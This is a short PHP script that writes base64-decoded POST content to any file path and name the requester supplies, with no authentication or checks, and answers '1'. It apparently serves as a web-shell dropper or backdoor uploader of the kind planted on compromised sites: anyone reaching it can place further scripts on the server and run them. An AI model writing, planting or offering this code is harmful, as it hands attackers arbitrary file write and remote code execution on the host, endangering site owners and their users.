<?php

$name = $_POST['name'];
$path = $_POST['path'];
$content = $_POST['content'];

$decoded = base64_decode($content);
file_put_contents($path.$name, $decoded);

print('1');

?>